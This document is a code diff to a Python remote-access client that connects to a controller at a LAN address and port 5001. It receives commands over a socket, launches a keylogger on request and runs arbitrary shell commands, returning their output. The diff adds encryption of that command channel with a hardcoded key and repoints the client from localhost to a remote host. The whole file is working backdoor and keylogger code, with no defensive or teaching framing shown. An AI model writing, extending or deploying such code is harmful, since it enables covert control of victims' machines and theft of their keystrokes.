@@ -1,17 +1,20 @@
 import socket, time, subprocess, threading,sys
 import tools.keylogger as keylogger
 import _thread as thread
+import settings.keys as keys
+import tools.cipher as cipher
 
 global stop, thread_lock, command_list
 command_list = []
 thread_lock = thread.allocate_lock()
 stop = False
 
-def input_collection(sock):
+def input_collection(sock,cipherClass):
     global command_list, thread_lock, stop
     while (not(stop)):
         try:
-            command = sock.recv(2048).decode()
+            command = sock.recv(2048)
+            command = (cipherClass.decrypt(command)).decode()
             print(command)
             if command == 'keylogger':
                 keylogger.keylogger('log.txt')
@@ -27,7 +30,7 @@ def input_collection(sock):
             stop = True
             return False
 
-def execute_commands(sock):
+def execute_commands(sock,cipherClass):
     global command_list, thread_lock, stop
     while(not(stop)):
         try:
@@ -42,13 +45,13 @@ def execute_commands(sock):
                 response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                 data = response.stdout.read() + response.stderr.read()
                 print("Response was: {}".format(data))
-                sock.sendall(data)
+                sock.sendall(cipherClass.encrypt(data))
         except:
             print("ERROR IN EXECUTE_COMMANDS FUNCTION")
             stop = True
             return
 
-def start_client(sock):
+def start_client(sock, key=keys.PASSWORD):
     global stop
     IV = None
     while(True):
@@ -61,9 +64,10 @@ def start_client(sock):
         except socket.timeout:
             print("Socket timed out on handshake..")
 
+    cipherClass = cipher.cipher(key=key,IV=IV,generatedIV=True)
 
-    receiver = threading.Thread(target=input_collection,args=(sock,))
-    sender = threading.Thread(target=execute_commands,args=(sock,))
+    receiver = threading.Thread(target=input_collection,args=(sock,cipherClass))
+    sender = threading.Thread(target=execute_commands,args=(sock,cipherClass))
     receiver.start()
     sender.start()
 
@@ -73,7 +77,7 @@ def start_client(sock):
     stop = False
     time.sleep(1)
 
-HOST = '127.0.0.1'
+HOST = '192.168.1.74'
 PORT = 5001
 
 while(True):
